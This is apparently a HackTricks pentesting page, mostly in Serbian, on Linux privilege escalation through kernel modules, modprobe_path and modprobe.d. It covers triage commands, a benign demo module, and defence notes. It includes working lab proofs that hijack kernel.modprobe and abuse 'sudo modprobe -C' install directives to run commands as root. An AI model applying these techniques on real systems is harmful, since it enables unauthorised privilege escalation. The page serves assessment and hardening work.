# Zloupotreba Kernel modula i modprobe

{{#include ../../banners/hacktricks-training.md}}

## Pogrešne konfiguracije Kernel modula i učitavanja modula

Podrška za Kernel module je oblast visokog uticaja tokom provere eskalacije privilegija na Linuxu. Nemojte svaku poruku o nepotpisanom modulu automatski smatrati mogućom za exploit, već je koristite za odgovore na praktična pitanja.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Da li trenutni korisnik može da učitava module putem `sudo`, capabilities ili writable pomoćne putanje?
- Da li je učitavanje modula i dalje omogućeno?
- Da li je provera potpisa modula onemogućena?
- Da li su direktorijumi modula, datoteke modula ili konfiguracione putanje `modprobe.d` writable?<sup>[[16]](#references)</sup>
- Da li se mogu čitati Kernel logovi radi potvrde onoga što se dogodilo?

Brza trijaža počinje sledećim proverama statusa modula, potpisa, logovanja i stabla modula.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Tumačenje:

- `modules_disabled=1` znači da se moduli ne mogu ni učitati ni ukloniti, a vrednost se ne može vratiti na `0` do ponovnog pokretanja sistema.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` u liniji za pokretanje kernela ili `CONFIG_MODULE_SIG_FORCE=y` zahteva validno potpisane module; u suprotnom, nepotpisani moduli mogu biti učitani i označiti kernel kao kompromitovan.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` ne nameće nikakva ograničenja za `dmesg`; kada je postavljeno na `1`, pristup zahteva `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Putanje sa dozvolom upisivanja unutar `/lib/modules/$(uname -r)/` su opasne zato što `modprobe` pretražuje to stablo i podatke o njegovim zavisnostima prilikom učitavanja modula.<sup>[[8]](#references)</sup>

### Učitavanje modula i čitanje izlaza kernela

Ako imate legitimnu dozvolu za učitavanje lokalnog modula, `insmod` umeće tačnu `.ko` datoteku koju navedete. Init funkcija modula izvršava se kao deo učitavanja, a poruke zapisane pomoću `printk()` odlaze u bafer dnevnika kernela, koji se obično čita pomoću `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalni tok provere koristi `modinfo` za pregled metapodataka, `insmod` i `rmmod` za učitavanje i uklanjanje modula, `lsmod` za potvrdu stanja učitanosti i `dmesg` za pregled dnevnika kernela.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ako `sudo -l` dozvoljava `insmod`, `modprobe` ili omotač oko njih, tretirajte to kao kritično: `sudo -l` prikazuje privilegije korisnika koji izvršava komandu, a učitavanje kernel modula zahteva `CAP_SYS_MODULE`. Pogledajte [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) za direktne puteve zasnovane na capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Sudo pravilo koje korisniku omogućava pokretanje komande `insmod` nije uporedivo sa omogućavanjem korišćenja običnog administrativnog helper-a. Kod za inicijalizaciju modula izvršava se kao deo njegovog učitavanja, pa je praktično pitanje tokom provere da li ovaj korisnik može da izabere ili izmeni modul koji se učitava.<sup>[[3]](#references)</sup>

Sledeći generički tok provere ponavlja provere inspekcije, učitavanja, stanja, logova i uklanjanja za kandidatski modul.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
If the user can provide an arbitrary `.ko`, the rule should be treated as full system compromise in an authorized assessment. A safer operational pattern is to avoid delegating module loading through sudo; if it is unavoidable, restrict the exact path, ownership, permissions, signing policy, and removal workflow.<sup>[[3]](#references)[[10]](#references)</sup>

For a harmless module-building pattern in a controlled lab, a minimal source and Makefile are shown below; the `make -C /lib/modules/$(uname -r)/build M=$PWD` form follows the kernel's documented kbuild workflow for external modules.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Izgradite i učitajte samo u ovlašćenoj laboratoriji; kbuild izgrađuje eksterni modul, a komande za učitavanje/uklanjanje pozivaju interfejse kernel modula.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` provere zloupotrebe

`kernel.modprobe` navodi userspace helper koji kernel izvršava za zahteve za automatsko učitavanje modula; ovaj sysctl utiče na automatsko učitavanje, a ne na eksplicitno ubacivanje modula. Ako napadač može da ga promeni u putanju do izvršne datoteke u koju može da se upisuje i pokrene zahtev za modulom, taj helper postaje privilegovana putanja za izvršavanje koda. Postavljanje na prazan string onemogućava zahteve za automatsko učitavanje; ako je `CONFIG_STATIC_USERMODEHELPER=y`, ne-prazna vrednost se zamenjuje statičkom putanjom helpera ugrađenom pri kompajliranju.<sup>[[1]](#references)</sup>

Proverite trenutnu putanju helpera kroz kernel sysctl interfejs i ispitajte vlasništvo i režim pristupa cilja.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Proverite da li je moguće uticati na sysctl, delegirana sudo pravila ili capabilities datoteka.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Sledeći obrazac namenjen je isključivo laboratorijskom okruženju, menja putanju pomoćnika i pokreće dokumentovani zahtev za automatsko učitavanje modula; koristite ga samo na izolovanom sistemu za koji imate ovlašćenje.<sup>[[1]](#references)</sup>

Na aktuelnim Linux kernelima nemojte koristiti nepoznatu izvršnu datoteku kao generički okidač: nasleđeno automatsko učitavanje modula za prilagođene binarne formate uklonjeno je u Linuxu 6.14, dok dokumentacija kernela navodi nepoznat tip sistema datoteka kao putanju za zahtev za automatsko učitavanje modula.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Na ojačanim sistemima, ovo bi trebalo da ne uspe kada dozvole sprečavaju neprivilegovano upisivanje u `kernel.modprobe`, kada putanja do pomoćnog programa nije upisiva ili kada je automatsko učitavanje modula onemogućeno.<sup>[[1]](#references)</sup>

### Upisiva `modprobe.d` konfiguracija i `sudo modprobe -C`

Pre rešavanja modula, `modprobe` čita `.conf` datoteke iz konfiguracionih direktorijuma kao što su `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` i `/lib/modprobe.d`, prema redosledu prioriteta. Datoteka sa istim imenom u direktorijumu višeg prioriteta zasenjuje datoteku iz direktorijuma nižeg prioriteta. Još važnije, direktiva `install <module> <command>` izvršava proizvoljnu shell komandu **umesto** umetanja tog modula. Zbog toga upisiva konfiguraciona putanja može postati odloženo izvršavanje komande sa privilegijama kasnijeg privilegovanog pozivaoca `modprobe`; sprovođenje potpisa kernel modula ne autentifikuje ovu komandu u korisničkom prostoru.<sup>[[16]](#references)</sup>

Proverite dozvole direktorijuma i datoteka, a zatim pregledajte efektivnu konfiguraciju. `modprobe -n -v` je bezbedan za proveru rešavanja, jer režim dry-run niti umeće modul niti izvršava komandu `install`/`remove`. Dajte prednost komandi `modprobe -c` u odnosu na zastareli oblik `--showconfig`, koji aktuelna kmod dokumentacija označava za uklanjanje nakon kmod verzije 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Neograničeno sudo pravilo za `modprobe` je moguće iskoristiti čak i kada proizvoljne `.ko` datoteke ne mogu da prođu verifikaciju potpisa: `-C` bira konfiguracioni direktorijum pod kontrolom napadača, iz kojeg proces pokrenut preko sudo-a može izvršiti komandu `install`.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Radi ublažavanja rizika, nemojte dozvoliti `modprobe` bez ograničenja argumenata kroz sudo, držite svaki konfiguracioni direktorijum u vlasništvu korisnika root i bez dozvole za upis, i proverite neočekivane direktive `install`/`remove`. Kada pouzdan administrativni tok rada mora da zaobiđe takve direktive za jedan modul, `modprobe --ignore-install` ih ignoriše za navedeni modul, ali zavisnosti i dalje mogu imati sopstvene komande.<sup>[[8]](#references)[[16]](#references)</sup>

### Pregled direktorijuma `/lib/modules` sa dozvolom za upis

Direktorijumi modula sa dozvolom za upis mogu omogućiti zamenu modula, postavljanje zlonamernih modula ili zloupotrebu automatskog učitavanja, u zavisnosti od toga kako se `modprobe` kasnije pozove; `modprobe` pretražuje `/lib/modules/$(uname -r)` i koristi podatke o zavisnostima prilikom rešavanja modula.<sup>[[8]](#references)</sup>

Proverite datoteke modula i metapodatke o zavisnostima/aliasima sa dozvolom za upis unutar stabla modula aktivne verzije kernela.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ako pronađete sadržaj modula sa dozvolom upisa, proverite kako `modprobe` razrešava zavisnosti i kako `modinfo` prikazuje metapodatke modula.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Napomene za odbranu:

- Održavajte da `/lib/modules` bude u vlasništvu `root:root` i da korisnici nemaju dozvolu upisa.<sup>[[8]](#references)</sup>
- Postavite `kernel.modules_disabled=1` nakon boot-a tamo gde je to operativno moguće.<sup>[[1]](#references)</sup>
- Primenite potpisivanje kernel modules na sistemima koji zahtevaju učitavanje modules.<sup>[[2]](#references)</sup>
- Nadgledajte upis u `/proc/sys/kernel/modprobe`, `/lib/modules` i konfiguracione direktorijume `modprobe.d`, kao i neočekivano izvršavanje `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Dokumentacija za /proc/sys/kernel/ — Dokumentacija Linux kernela](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mogućnost potpisivanja kernel module-a — Dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Osnove driver-a — Dokumentacija Linux kernela](https://docs.kernel.org/driver-api/basics.html)
- [6] [Beleženje poruka pomoću printk — Dokumentacija Linux kernela](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Izgradnja eksternih module-a — Dokumentacija Linux kernela](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Spajanje oznake 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Stranica Linux priručnika](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
